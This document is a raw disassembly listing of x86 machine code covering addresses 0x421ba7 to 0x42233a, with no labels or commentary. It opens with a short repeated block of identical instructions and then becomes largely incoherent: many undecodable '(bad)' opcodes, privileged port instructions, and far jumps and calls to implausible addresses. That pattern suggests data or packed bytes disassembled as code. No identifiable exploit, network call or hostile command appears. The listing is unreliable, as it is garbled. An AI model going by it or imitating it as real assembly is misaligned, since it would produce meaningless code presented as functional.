  421ba7:	xchg   edi,eax
  421ba8:	inc    esp
  421ba9:	in     eax,dx
  421baa:	xor    BYTE PTR [eax+0x3],cl
  421bad:	fs ins DWORD PTR es:[edi],dx
  421baf:	mov    esi,0xacb9ccbb
  421bb4:	xchg   edi,eax
  421bb5:	inc    esp
  421bb6:	in     eax,dx
  421bb7:	xor    BYTE PTR [eax+0x3],cl
  421bba:	fs ins DWORD PTR es:[edi],dx
  421bbc:	mov    esi,0xacb9ccbb
  421bc1:	xchg   edi,eax
  421bc2:	inc    esp
  421bc3:	in     eax,dx
  421bc4:	xor    BYTE PTR [eax+0x3],cl
  421bc7:	fs ins DWORD PTR es:[edi],dx
  421bc9:	mov    esi,0xacb9ccbb
  421bce:	xchg   edi,eax
  421bcf:	inc    esp
  421bd0:	in     eax,dx
  421bd1:	xor    BYTE PTR [eax+0x3],cl
  421bd4:	fs ins DWORD PTR es:[edi],dx
  421bd6:	mov    esi,0xacb9ccbb
  421bdb:	xchg   edi,eax
  421bdc:	inc    esp
  421bdd:	in     eax,dx
  421bde:	xor    BYTE PTR [eax+0x3],cl
  421be1:	fs ins DWORD PTR es:[edi],dx
  421be3:	mov    esi,0xacb9ccbb
  421be8:	xchg   edi,eax
  421be9:	inc    esp
  421bea:	in     eax,dx
  421beb:	xor    BYTE PTR [eax+0x3],cl
  421bee:	fs ins DWORD PTR es:[edi],dx
  421bf0:	mov    esi,0xacb9ccbb
  421bf5:	xchg   edi,eax
  421bf6:	inc    esp
  421bf7:	in     eax,dx
  421bf8:	xor    BYTE PTR [eax+0x3],cl
  421bfb:	fs ins DWORD PTR es:[edi],dx
  421bfd:	mov    esi,0xacb9ccbb
  421c02:	xchg   edi,eax
  421c03:	inc    esp
  421c04:	in     eax,dx
  421c05:	xor    BYTE PTR [eax+0x3],cl
  421c08:	fs ins DWORD PTR es:[edi],dx
  421c0a:	mov    esi,0xacb9ccbb
  421c0f:	xchg   edi,eax
  421c10:	inc    esp
  421c11:	in     eax,dx
  421c12:	xor    BYTE PTR [eax+0x3],cl
  421c15:	fs ins DWORD PTR es:[edi],dx
  421c17:	mov    esi,0xacb9ccbb
  421c1c:	xchg   edi,eax
  421c1d:	inc    esp
  421c1e:	in     eax,dx
  421c1f:	xor    BYTE PTR [eax+0x3],cl
  421c22:	fs ins DWORD PTR es:[edi],dx
  421c24:	mov    esi,0xacb9ccbb
  421c29:	xchg   edi,eax
  421c2a:	inc    esp
  421c2b:	in     eax,dx
  421c2c:	xor    BYTE PTR [eax+0x6c],cl
  421c2f:	int3   
  421c30:	mov    si,0xcc94
  421c34:	mov    ecx,0xc74497bc
  421c39:	xchg   edx,eax
  421c3a:	xchg   edx,eax
  421c3b:	jb     0x421c3f
  421c3d:	xchg   edx,eax
  421c3e:	xchg   ebx,eax
  421c3f:	and    eax,0xa141e94b
  421c44:	lods   al,BYTE PTR ds:[esi]
  421c45:	inc    BYTE PTR [ebp+ebx*8-0x1b16ea9b]
  421c4c:	test   al,0x7d
  421c4e:	push   cs
  421c4f:	mov    edx,0xb167a0fa
  421c54:	mov    gs,WORD PTR ds:0x8281fd06
  421c5a:	push   esi
  421c5c:	sbb    eax,0x17ed6680
  421c61:	out    dx,eax
  421c62:	mov    esi,DWORD PTR [ecx]
  421c64:	cmp    al,0xd3
  421c66:	adc    bh,dh
  421c68:	test   BYTE PTR [ecx-0x7d],dh
  421c6b:	cmc    
  421c6c:	lea    edi,[edi]
  421c6e:	xchg   esi,eax
  421c6f:	daa    
  421c70:	fbld   TBYTE PTR [ecx]
  421c72:	ins    DWORD PTR es:[edi],dx
  421c73:	jle    0x421c58
  421c75:	inc    ecx
  421c76:	xor    bl,BYTE PTR [ebp-0x14ef7655]
  421c7c:	or     al,0x95
  421c7e:	(bad)  
  421c7f:	xchg   ebx,eax
  421c80:	(bad)  
  421c81:	mov    ah,0xff
  421c83:	std    
  421c84:	aam    0x8a
  421c86:	pop    esp
  421c87:	jbe    0x421cea
  421c89:	jle    0x421c84
  421c8b:	in     al,dx
  421c8c:	in     al,0x59
  421c8e:	retf   
  421c8f:	or     eax,0x92fa42e
  421c94:	adc    DWORD PTR [eax+0x180def62],edi
  421c9a:	scas   eax,DWORD PTR es:[edi]
  421c9b:	loopne 0x421cfb
  421c9d:	pop    es
  421c9e:	mov    edi,0xe80f0a0f
  421ca3:	sbb    BYTE PTR [ebx],bh
  421ca5:	fild   WORD PTR [edi*8-0x2a7a3d90]
  421cac:	push   0x12
  421cae:	add    DWORD PTR [ecx-0x31],edi
  421cb1:	shl    DWORD PTR [edx-0x30],cl
  421cb4:	sbb    DWORD PTR [edx+0x19d8104],edx
  421cba:	sub    DWORD PTR [ebp+0x9578c01],esp
  421cc0:	lods   eax,DWORD PTR ds:[esi]
  421cc1:	iret   
  421cc2:	dec    ebx
  421cc3:	xchg   ecx,eax
  421cc4:	out    dx,al
  421cc5:	retf   
  421cc6:	ret    0x1d50
  421cc9:	mov    edx,0xa63ce809
  421cce:	or     dl,cl
  421cd0:	push   ss
  421cd1:	out    0x67,al
  421cd3:	pop    esi
  421cd4:	fs jo  0x421cde
  421cd7:	sbb    ecx,DWORD PTR [eax-0x25]
  421cda:	push   esp
  421cdb:	add    esi,DWORD PTR [esi-0x3499c56b]
  421ce1:	xchg   DWORD PTR [eax],eax
  421ce3:	pop    ebp
  421ce4:	sub    DWORD PTR [ebx+0x18],esp
  421ce7:	aad    0x49
  421ce9:	jl     0x421c72
  421ceb:	ds push esp
  421ced:	(bad)  
  421cee:	adc    DWORD PTR [ecx],edi
  421cf0:	push   esi
  421cf1:	and    DWORD PTR [esi+0x23980ab0],0xcb467316
  421cfb:	lds    esp,FWORD PTR [esi-0x7a]
  421cfe:	fcomip st,st(0)
  421d00:	jp     0x421cc6
  421d02:	xchg   BYTE PTR [edx],bh
  421d04:	mov    bh,0xeb
  421d06:	arpl   sp,sp
  421d08:	(bad)  
  421d09:	mov    ebx,0xe5f3bee5
  421d0e:	mov    ebp,0xd44e24e6
  421d13:	test   DWORD PTR [eax],ecx
  421d15:	call   esi
  421d17:	mov    dh,0xec
  421d19:	xor    al,0x9d
  421d1b:	ss retf 0xa827
  421d1f:	pop    eax
  421d20:	dec    ebx
  421d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d22:	int    0x52
  421d24:	xchg   esp,eax
  421d25:	sbb    al,BYTE PTR [eax+0x10]
  421d28:	hlt    
  421d29:	push   edx
  421d2a:	lock cmp dh,BYTE PTR [esp+ebp*4+0x77]
  421d2f:	mov    esi,0x93d424b6
  421d34:	leave  
  421d35:	or     bh,BYTE PTR ds:0x5ee7a766
  421d3b:	fisubr DWORD PTR [eax+esi*8-0x233c3292]
  421d42:	sbb    eax,0x3ce368c5
  421d47:	imul   ecx,DWORD PTR [ebx-0xf],0xffffff83
  421d4b:	dec    ebx
  421d4c:	aas    
  421d4d:	std    
  421d4e:	adc    ebx,esi
  421d50:	mov    ss,WORD PTR [ebp-0x47]
  421d53:	js     0x421ceb
  421d55:	sub    eax,0x94b9e7b6
  421d5a:	imul   ebp,eax,0xffffffc4
  421d5d:	jg     0x421d6c
  421d5f:	mov    BYTE PTR [edi+0x1d],dl
  421d62:	sub    BYTE PTR [eax+0x71],0x39
  421d66:	in     al,0x4a
  421d68:	mov    bh,0xf9
  421d6a:	dec    edx
  421d6b:	jge    0x421dad
  421d6d:	or     eax,0x8ae88a86
  421d72:	mov    esp,0x8aa12a76
  421d77:	outs   dx,BYTE PTR ds:[esi]
  421d78:	fwait
  421d79:	imul   edx,edx,0x1470863
  421d7f:	les    ebp,FWORD PTR [edx-0x6a]
  421d82:	push   ebp
  421d83:	xchg   ecx,eax
  421d84:	(bad)  
  421d85:	imul   esp,DWORD PTR [edx],0xffffffa2
  421d88:	mov    ecx,0x955b4574
  421d8d:	sbb    al,0x70
  421d8f:	test   eax,0x62299ff2
  421d94:	les    ebx,FWORD PTR [eax+0x51777f1b]
  421d9a:	sti    
  421d9b:	xor    DWORD PTR [ebx+0x32],ebp
  421d9e:	js     0x421d85
  421da0:	jg     0x421d63
  421da2:	loopne 0x421d99
  421da4:	mov    cs,WORD PTR [edi-0x561d562c]
  421daa:	repz lock repnz iret 
  421dae:	or     eax,0x14b83a53
  421db3:	pop    ds
  421db4:	push   edi
  421db5:	dec    ecx
  421db6:	arpl   WORD PTR [edi],si
  421db8:	sbb    edx,DWORD PTR [ecx-0x1b]
  421dbb:	push   es
  421dbc:	inc    esi
  421dbd:	dec    ebp
  421dbe:	jmp    0x421dde
  421dc0:	cmp    edi,DWORD PTR [edx+ebx*4+0x7ac4f61d]
  421dc7:	sub    dl,ah
  421dc9:	ret    
  421dca:	repz in eax,0x40
  421dcd:	cmp    al,ah
  421dcf:	and    ch,BYTE PTR [ecx-0x64]
  421dd2:	ret    0x9b67
  421dd5:	iret   
  421dd6:	mov    gs,WORD PTR [esi-0x30]
  421dd9:	fild   QWORD PTR [esi+0x3c04dd7d]
  421ddf:	mov    al,0x89
  421de1:	(bad)  
  421de3:	adc    esi,edx
  421de5:	adc    bl,BYTE PTR [ecx-0x17]
  421de8:	jns    0x421d72
  421dea:	mov    ebx,0x2bb1f09c
  421def:	int    0x88
  421df1:	add    ebx,esp
  421df3:	int3   
  421df4:	inc    ebp
  421df5:	stos   DWORD PTR es:[edi],eax
  421df6:	cli    
  421df7:	out    0xbc,eax
  421df9:	(bad)  
  421dfa:	pop    esp
  421dfb:	shr    DWORD PTR [edx+eax*8-0x610b95d3],0x22
  421e03:	cli    
  421e04:	mov    dh,0x33
  421e06:	mov    esp,0x811b635a
  421e0b:	adc    al,0x76
  421e0d:	(bad)  
  421e0e:	sahf   
  421e0f:	sahf   
  421e10:	pusha  
  421e11:	add    edx,esi
  421e13:	add    DWORD PTR [esi-0x631409af],esp
  421e19:	mov    bh,0x75
  421e1b:	mov    ebp,0x8d3efb82
  421e20:	inc    edx
  421e21:	jge    0x421e35
  421e23:	loopne 0x421e40
  421e25:	xchg   ecx,eax
  421e26:	and    al,BYTE PTR [ebx-0x76]
  421e29:	jp     0x421e77
  421e2b:	(bad)  
  421e2c:	mov    bl,0x56
  421e2e:	push   ecx
  421e2f:	xor    eax,0x9f3f4662
  421e34:	mov    eax,0x96a88b30
  421e39:	xchg   DWORD PTR [edx+0x4c],esi
  421e3c:	pop    esp
  421e3d:	scas   eax,DWORD PTR es:[edi]
  421e3e:	std    
  421e3f:	mov    al,0xa1
  421e41:	std    
  421e42:	push   edi
  421e43:	xor    BYTE PTR [edx-0x2fee58ac],ah
  421e49:	jp     0x421e75
  421e4b:	pop    ebp
  421e4c:	retf   
  421e4d:	push   ecx
  421e4e:	cmp    esp,DWORD PTR [ecx+edx*1+0x75]
  421e52:	ret    0xfef0
  421e55:	push   esp
  421e56:	xchg   edi,eax
  421e57:	clc    
  421e58:	dec    edx
  421e59:	or     ecx,ebx
  421e5b:	inc    ebx
  421e5c:	push   esi
  421e5d:	loop   0x421e86
  421e5f:	popa   
  421e60:	in     eax,0x5b
  421e62:	ror    BYTE PTR [edi],1
  421e64:	mov    ?,WORD PTR [eax+0x9bff37c]
  421e6a:	mov    ebp,0x32a31907
  421e6f:	clc    
  421e70:	outs   dx,DWORD PTR ds:[esi]
  421e71:	cmp    ecx,DWORD PTR [eax+0x1b]
  421e74:	(bad)  
  421e75:	and    cl,BYTE PTR [esi]
  421e77:	aad    0x79
  421e79:	mov    esp,0x1825ea7a
  421e7e:	jmp    0x4c246132
  421e83:	jecxz  0x421ec8
  421e85:	inc    edx
  421e86:	sbb    DWORD PTR [edi-0x1d],esp
  421e89:	outs   dx,DWORD PTR ds:[esi]
  421e8a:	mov    ds:0x311296ee,al
  421e8f:	cmp    al,0x17
  421e91:	xchg   edx,eax
  421e92:	push   esp
  421e93:	(bad)  
  421e94:	(bad)  [esi+0x6954faf1]
  421e9a:	dec    edi
  421e9b:	fld    TBYTE PTR [ebx]
  421e9d:	sub    edi,DWORD PTR [ebx+eax*4]
  421ea0:	xchg   esp,eax
  421ea1:	sbb    eax,0xd5acb34f
  421ea6:	imul   edx,DWORD PTR [edx+ebp*8],0xcb4b87a8
  421ead:	mov    dh,0x54
  421eaf:	xlat   BYTE PTR ds:[ebx]
  421eb0:	mov    al,0x45
  421eb2:	adc    bh,dl
  421eb4:	aad    0x39
  421eb6:	or     al,BYTE PTR [ebx-0x47]
  421eb9:	jo     0x421e8a
  421ebb:	lds    esi,FWORD PTR [edi-0x56]
  421ebe:	or     eax,0x92d47dd8
  421ec3:	jnp    0x421e5d
  421ec5:	dec    ecx
  421ec6:	sbb    al,0xd5
  421ec8:	cmp    cl,BYTE PTR [eax+0x20]
  421ecb:	shl    DWORD PTR [ebx+0x7f6b0810],cl
  421ed1:	push   edi
  421ed2:	in     al,0x35
  421ed4:	shl    BYTE PTR [esi+0x3504cc2d],0x3d
  421edb:	xor    esp,DWORD PTR [edi+0x2a]
  421ede:	rol    BYTE PTR [ecx],0x6d
  421ee1:	sub    al,0x56
  421ee3:	xchg   ecx,eax
  421ee4:	add    al,0x4d
  421ee6:	out    dx,eax
  421ee7:	fdivp  st(7),st
  421ee9:	mov    esi,0xcf33e464
  421eee:	jbe    0x421ebe
  421ef0:	pop    esi
  421ef1:	fcmovnb st,st(0)
  421ef3:	leave  
  421ef4:	pop    ecx
  421ef5:	leave  
  421ef6:	and    BYTE PTR [esi],0x5
  421ef9:	int    0xe3
  421efb:	xchg   BYTE PTR [ebp-0x1d],ch
  421efe:	fucomip st,st(6)
  421f00:	enter  0x5595,0x55
  421f04:	dec    ebx
  421f05:	leave  
  421f06:	mov    al,al
  421f08:	xchg   edi,eax
  421f09:	test   eax,0x847c569b
  421f0e:	dec    edi
  421f0f:	rcl    BYTE PTR [edi-0x349ca039],0x6e
  421f16:	sub    eax,0xabaaa9eb
  421f1b:	jg     0x421ed8
  421f1d:	or     edx,ebp
  421f1f:	dec    edi
  421f20:	jge    0x421ee8
  421f22:	or     ebp,DWORD PTR [esi+ecx*8+0x73f206b8]
  421f29:	adc    ebp,DWORD PTR [edi-0x58]
  421f2c:	mov    ds:0x56cc52d8,al
  421f31:	push   ebx
  421f32:	rcl    cl,cl
  421f34:	sub    al,0x8a
  421f36:	pop    ebx
  421f37:	call   0x48fd:0x430ba053
  421f3e:	gs jge 0x421f72
  421f41:	rcl    BYTE PTR [edi+eax*1],1
  421f44:	iret   
  421f45:	sbb    DWORD PTR [ebx-0x5ba49549],edx
  421f4b:	xor    edx,ebx
  421f4d:	lods   al,BYTE PTR ds:[esi]
  421f4e:	mov    esi,0xf3c5c151
  421f53:	xchg   BYTE PTR [ebx-0x426cf675],bl
  421f59:	and    ah,bl
  421f5b:	pop    esp
  421f5c:	call   0xe3a5502d
  421f61:	fs pop esp
  421f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f64:	rcl    BYTE PTR [esi+0x5ea29f10],1
  421f6a:	cwde   
  421f6b:	stos   BYTE PTR es:[edi],al
  421f6c:	lods   eax,DWORD PTR ds:[esi]
  421f6d:	iret   
  421f6e:	inc    ecx
  421f6f:	mov    eax,0x9bfdf2b0
  421f74:	pop    ecx
  421f75:	cmp    al,0x55
  421f77:	test   DWORD PTR [edx],ebx
  421f79:	lea    eax,[esi-0x45]
  421f7c:	and    BYTE PTR [esp+ecx*2+0x64],dh
  421f80:	push   eax
  421f81:	add    ah,BYTE PTR [ebx-0x46]
  421f84:	jecxz  0x421f25
  421f86:	jo     0x421f5c
  421f88:	sub    esi,DWORD PTR [ebx+0x30df3041]
  421f8e:	adc    al,0x53
  421f90:	pop    DWORD PTR [edx+0xc409105]
  421f96:	rcr    BYTE PTR [edi+0x62c4c1b0],cl
  421f9c:	sbb    bl,BYTE PTR [esi]
  421f9e:	stc    
  421f9f:	add    al,0x86
  421fa1:	dec    edi
  421fa2:	mov    bl,0x30
  421fa4:	daa    
  421fa5:	out    0xc4,al
  421fa7:	es into 
  421fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421faa:	mov    eax,0x9906d3f5
  421faf:	enter  0x3169,0xee
  421fb3:	cmp    DWORD PTR [ecx],esp
  421fb5:	popw   ss
  421fb7:	fisub  DWORD PTR [eax-0x7750a3b2]
  421fbd:	repz loopne 0x421f68
  421fc0:	dec    edx
  421fc1:	sbb    al,0x39
  421fc3:	mov    edi,0x36301edd
  421fc8:	sbb    ah,BYTE PTR [edx+0x39]
  421fcb:	mov    fs,ecx
  421fcd:	sbb    bl,BYTE PTR [edx+0x57]
  421fd0:	inc    ebp
  421fd1:	jmp    0x989:0xdb46a0ff
  421fd8:	int    0x85
  421fda:	aad    0x27
  421fdc:	scas   eax,DWORD PTR es:[edi]
  421fdd:	ja     0x421fd3
  421fdf:	test   al,0x7e
  421fe1:	inc    esi
  421fe2:	lods   eax,DWORD PTR ds:[esi]
  421fe3:	(bad)  [ebp+0x3ac8afbe]
  421fe9:	inc    ecx
  421fea:	mov    edi,0x6838ce44
  421fef:	ret    0x6c5b
  421ff2:	xlat   BYTE PTR ds:[ebx]
  421ff3:	fld    DWORD PTR [ebx-0x68]
  421ff6:	inc    ebx
  421ff7:	pop    ss
  421ff8:	sub    eax,0xc16ec9b5
  421ffd:	ja     0x421fef
  421fff:	pop    ebx
  422000:	mov    esi,0x5bcb34a6
  422005:	sbb    BYTE PTR [esi+0x2d09fb3b],0xc4
  42200c:	sbb    DWORD PTR [ecx],0xffffffa5
  42200f:	cmp    dl,dh
  422011:	xchg   edx,eax
  422012:	mov    al,0x7e
  422014:	test   cl,ah
  422016:	and    eax,0x7b4d710
  42201b:	sub    DWORD PTR [ebx+0x31],esp
  42201e:	cmp    eax,0xe694be78
  422023:	or     DWORD PTR ds:0x5392608e,edx
  42202a:	mov    eax,ds:0xf7035033
  42202f:	daa    
  422030:	push   ecx
  422031:	and    al,0x3b
  422033:	mov    ds:0xe0f68bc0,eax
  422038:	mov    eax,ds:0x29ba1c19
  42203d:	mov    DWORD PTR [ecx+0x16],ebp
  422040:	mov    ebx,0x227f4651
  422045:	mov    ch,0x7d
  422047:	mov    edi,0x676e67aa
  42204c:	ret    0xb899
  42204f:	and    DWORD PTR [edx],edx
  422051:	js     0x4220a6
  422053:	ret    0xf89e
  422056:	adc    eax,0xe00a982c
  42205b:	stos   DWORD PTR es:[edi],eax
  42205c:	push   edx
  42205d:	sbb    al,0x61
  42205f:	mov    ecx,0xdd84b1a1
  422064:	sub    ebp,DWORD PTR [ecx+0x1213e03f]
  42206a:	mul    DWORD PTR [esi]
  42206c:	pushf  
  42206d:	add    al,0xc6
  42206f:	mov    ds:0x509dde39,eax
  422074:	aad    0xb9
  422076:	mov    eax,ds:0x3fb3bd97
  42207b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42207c:	mov    bh,0x80
  42207e:	pop    ds
  42207f:	imul   esi,DWORD PTR [eax+0x17],0x5542adb7
  422086:	pusha  
  422087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422088:	retf   
  422089:	xlat   BYTE PTR ds:[ebx]
  42208a:	out    0x1c,eax
  42208c:	sbb    DWORD PTR [esi],edi
  42208e:	inc    edx
  42208f:	xchg   edx,eax
  422090:	dec    eax
  422091:	dec    ebp
  422092:	jg     0x4220e9
  422094:	ds push 0x46
  422097:	mov    ds:0x66e9494,eax
  42209c:	imul   edx,ecx,0x8c03d132
  4220a2:	inc    edi
  4220a3:	mov    ecx,0x85f5ba2
  4220a8:	inc    ebx
  4220a9:	push   es
  4220aa:	jbe    0x422033
  4220ac:	jmp    0xa68b:0xaeb110b8
  4220b3:	lods   eax,DWORD PTR ds:[esi]
  4220b4:	mov    ch,0xe6
  4220b6:	xchg   ebx,ecx
  4220b8:	not    DWORD PTR [eax-0x4f]
  4220bb:	dec    eax
  4220bc:	xor    al,0x46
  4220be:	repz jge 0x42209a
  4220c1:	ret    
  4220c2:	sbb    al,0xf8
  4220c4:	test   eax,0xf4c97b53
  4220c9:	dec    eax
  4220ca:	pusha  
  4220cb:	nop
  4220cc:	in     al,dx
  4220cd:	out    0xb0,eax
  4220cf:	jo     0x422116
  4220d1:	retf   
  4220d2:	ins    BYTE PTR es:[edi],dx
  4220d3:	(bad)  
  4220d4:	stc    
  4220d5:	push   cs
  4220d6:	fs jle 0x422118
  4220d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220da:	stc    
  4220db:	sbb    ecx,DWORD PTR [ebx-0x6a46a390]
  4220e1:	sbb    eax,0xdc9ba89c
  4220e6:	fs pop ss
  4220e8:	sub    ecx,ecx
  4220ea:	and    DWORD PTR [edx+edi*1],0xab9ed0d8
  4220f1:	push   ebp
  4220f2:	jbe    0x87b2237f
  4220f8:	outs   dx,DWORD PTR ds:[esi]
  4220f9:	iret   
  4220fa:	mov    eax,ds:0x47a0771
  4220ff:	and    ebp,ecx
  422101:	aaa    
  422102:	jmp    0x6fefad22
  422107:	mov    al,0xfc
  422109:	cli    
  42210a:	push   ecx
  42210b:	iret   
  42210c:	xchg   esi,eax
  42210d:	in     al,0xae
  42210f:	jle    0x422164
  422111:	inc    esi
  422112:	sub    ecx,DWORD PTR [edi+0x43]
  422115:	js     0x422182
  422117:	daa    
  422118:	pop    eax
  422119:	xor    eax,0xdf6c8f53
  42211e:	mov    dh,BYTE PTR [edx-0x3e153344]
  422124:	mov    bl,0x14
  422126:	xor    BYTE PTR [ecx-0x77],ch
  422129:	cmc    
  42212a:	add    al,0x6f
  42212c:	xchg   esi,eax
  42212d:	cs adc eax,0xcf4226e1
  422133:	aam    0xc5
  422135:	(bad)  
  422136:	sub    DWORD PTR [ebx-0x72],ebp
  422139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42213a:	test   edx,ebp
  42213c:	sub    bl,dh
  42213e:	push   ecx
  42213f:	sbb    ebp,DWORD PTR [ecx-0x12af59a3]
  422145:	loope  0x4220fb
  422147:	outs   dx,DWORD PTR ds:[esi]
  422148:	add    DWORD PTR [edx-0x66],ebx
  42214b:	scas   al,BYTE PTR es:[edi]
  42214c:	mov    dl,0xf7
  42214e:	pop    esp
  42214f:	retf   0xb732
  422152:	test   DWORD PTR [esi],edx
  422154:	pop    ebp
  422155:	hlt    
  422156:	out    dx,eax
  422157:	xchg   esp,eax
  422158:	imul   esp,eax,0x9daafff1
  42215e:	mov    ch,BYTE PTR [edi]
  422160:	mov    bh,0x81
  422162:	retf   
  422163:	loope  0x422104
  422165:	dec    ebp
  422166:	outs   dx,DWORD PTR ds:[esi]
  422167:	loope  0x422166
  422169:	(bad)  
  42216a:	aam    0x6c
  42216c:	mov    ebp,0xd3a6b1f1
  422171:	and    cl,BYTE PTR [ebx-0x50]
  422174:	(bad)  
  422175:	mov    ch,0xfd
  422177:	(bad)  [ecx-0x2c51816a]
  42217d:	cmp    al,BYTE PTR [ecx+edx*1+0x55]
  422181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422182:	or     eax,0xe1ed4ac
  422187:	(bad)  
  422188:	std    
  422189:	dec    edi
  42218a:	adc    edx,esi
  42218c:	push   DWORD PTR [edi]
  42218e:	push   ebp
  42218f:	mov    ebp,0xdf869534
  422194:	inc    esi
  422195:	cmp    ecx,ecx
  422197:	mov    eax,ds:0xa5563c24
  42219c:	jno    0x422216
  42219e:	jbe    0x4221ce
  4221a0:	fmul   DWORD PTR [eax-0x674864ef]
  4221a6:	das    
  4221a7:	test   esp,edx
  4221a9:	cwde   
  4221aa:	addr16 clc 
  4221ac:	add    al,bh
  4221ae:	mov    edi,0x4e4a94c4
  4221b3:	(bad)  
  4221b4:	jns    0x4221d9
  4221b6:	call   0x6ba4f8e
  4221bb:	inc    eax
  4221bc:	lods   al,BYTE PTR ds:[esi]
  4221bd:	mov    ch,0x41
  4221bf:	je     0x422202
  4221c1:	inc    eax
  4221c2:	dec    esp
  4221c3:	fs sub eax,0xad32b3d3
  4221c9:	movq   mm5,QWORD PTR [edx]
  4221cc:	sbb    al,0xf9
  4221ce:	mov    cl,0xcc
  4221d0:	mov    esp,0xd98d5e11
  4221d5:	fisubr DWORD PTR [edx]
  4221d7:	test   al,0xb0
  4221d9:	in     eax,dx
  4221da:	hlt    
  4221db:	ins    DWORD PTR es:[edi],dx
  4221dc:	mov    bl,0x14
  4221de:	popf   
  4221df:	sbb    DWORD PTR [esi],esp
  4221e1:	ins    BYTE PTR es:[edi],dx
  4221e2:	mov    ebx,0xd89ec713
  4221e7:	cmp    eax,0x9ce4981d
  4221ec:	jo     0x422202
  4221ee:	inc    ebp
  4221ef:	lods   al,BYTE PTR ds:[esi]
  4221f0:	sub    al,0x7c
  4221f2:	pop    edi
  4221f3:	push   edi
  4221f4:	aaa    
  4221f5:	adc    eax,0x624a0b01
  4221fa:	outs   dx,DWORD PTR ds:[esi]
  4221fb:	shl    DWORD PTR [eax+0x31ca67ed],0xa2
  422202:	mov    cl,0xae
  422204:	clc    
  422205:	adc    al,0x56
  422207:	or     esi,DWORD PTR [ecx-0x6c]
  42220a:	xchg   ecx,eax
  42220b:	cmp    DWORD PTR cs:[eax+eiz*8+0x16],edx
  422210:	cmc    
  422211:	pop    ebx
  422212:	jmp    0x71899408
  422217:	push   edi
  422218:	or     eax,eax
  42221a:	ficom  WORD PTR [ecx]
  42221c:	cwde   
  42221d:	pop    esp
  42221e:	fiadd  WORD PTR [ecx]
  422220:	mov    bh,0x14
  422222:	dec    esi
  422223:	pop    ss
  422224:	mov    ch,0x86
  422226:	pop    ds
  422227:	sub    ch,bh
  422229:	cdq    
  42222a:	(bad)  
  42222b:	jne    0x4221d3
  42222d:	xchg   edi,eax
  42222e:	cld    
  42222f:	mov    WORD PTR [ebx+0x38],es
  422232:	test   BYTE PTR [edx+0x1f],ah
  422235:	push   edx
  422236:	mov    ebx,0xae16dd
  42223b:	test   eax,0xbeb070cf
  422240:	scas   al,BYTE PTR es:[edi]
  422241:	cmp    ebp,DWORD PTR [ebx+0x44]
  422244:	fcmovnb st,st(7)
  422246:	and    DWORD PTR [eax-0x35],ebp
  422249:	cld    
  42224a:	jmp    0x69bf:0xbf1c34cb
  422251:	mov    edx,esi
  422253:	add    al,0x9e
  422255:	mov    al,0x1e
  422257:	test   DWORD PTR [ebp+0x64],ecx
  42225a:	mov    ecx,0xc0053918
  42225f:	dec    BYTE PTR fs:[eax+0x30]
  422263:	or     ebx,0x3b61d25
  422269:	mov    al,ds:0x35a500b4
  42226e:	xchg   edi,eax
  42226f:	das    
  422270:	jmp    0xb1ccd892
  422275:	iret   
  422276:	cdq    
  422277:	lahf   
  422278:	mov    BYTE PTR [ecx-0xd3bfb55],cl
  42227e:	leave  
  42227f:	mov    edi,0x56f68b19
  422284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422285:	mov    ah,0xd1
  422287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422288:	push   ecx
  422289:	cmc    
  42228a:	hlt    
  42228b:	mov    al,0xef
  42228d:	stc    
  42228e:	mov    bl,0x21
  422290:	mov    eax,0x5fbd97b9
  422295:	xchg   ecx,eax
  422296:	jecxz  0x42223e
  422298:	inc    edx
  422299:	and    eax,0xac1da50b
  42229e:	cmp    DWORD PTR [edi+edi*4-0x740a5da8],ebx
  4222a5:	(bad)  
  4222a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a8:	xchg   edx,eax
  4222a9:	pop    edi
  4222aa:	dec    ebp
  4222ab:	fcom   QWORD PTR [ebx]
  4222ad:	jne    0x422305
  4222af:	mov    DWORD PTR [esi+ecx*8],edi
  4222b2:	out    dx,eax
  4222b3:	out    dx,al
  4222b4:	fs pop fs
  4222b7:	inc    eax
  4222b8:	and    esi,DWORD PTR [edx]
  4222ba:	lods   al,BYTE PTR ds:[esi]
  4222bb:	pop    es
  4222bc:	aas    
  4222bd:	fcmovu st,st(1)
  4222bf:	cld    
  4222c0:	adc    al,0x1c
  4222c2:	cli    
  4222c3:	fistp  QWORD PTR [edx-0x7150daed]
  4222c9:	or     DWORD PTR [ebp-0x151fe000],0xffffff8d
  4222d0:	sbb    al,0x99
  4222d2:	popa   
  4222d3:	je     0x42230d
  4222d5:	idiv   esi
  4222d7:	inc    ebp
  4222d8:	dec    eax
  4222d9:	fild   WORD PTR [edi]
  4222db:	fisubr DWORD PTR [esp+edi*8]
  4222de:	lea    esi,[edi-0x54edb911]
  4222e4:	test   BYTE PTR [ebp+0x15],0x76
  4222e8:	enter  0x6df2,0xd0
  4222ec:	add    ah,dh
  4222ee:	int3   
  4222ef:	test   DWORD PTR [eax],esp
  4222f1:	jno    0x4222db
  4222f3:	mov    esp,0xe73313c
  4222f8:	inc    ecx
  4222f9:	loopne 0x42230a
  4222fb:	out    0x9c,al
  4222fd:	xchg   edx,eax
  4222fe:	imul   esp,esi,0x13
  422301:	mov    DWORD PTR [edi+edi*4+0x26effba9],edx
  422308:	ins    DWORD PTR es:[edi],dx
  422309:	jge    0x42233a
  42230b:	mov    cl,0x3f
  42230d:	aaa    
  42230e:	hlt    
  42230f:	mov    ebp,0x7a8e0898
  422314:	mov    WORD PTR [eax-0x4b54d5e3],ds
  42231a:	mov    ch,0xf6
  42231c:	xchg   ebx,eax
  42231d:	ds adc edi,0xffffffb2
  422321:	rcr    DWORD PTR [ecx+0x38],0x90
  422325:	stos   BYTE PTR es:[edi],al
  422326:	fsub   DWORD PTR [edi]
  422328:	xchg   ebp,eax
  422329:	jmp    0x53ff:0x7ccdba3b
  422330:	pushf  
  422331:	aad    0xce
  422333:	ss scas eax,DWORD PTR es:[edi]
  422335:	jnp    0x422347
  422337:	(bad)  
  422338:	fdiv   QWORD PTR [eax]
  42233a:	mov    dl,BYTE PTR [esi+0x12]
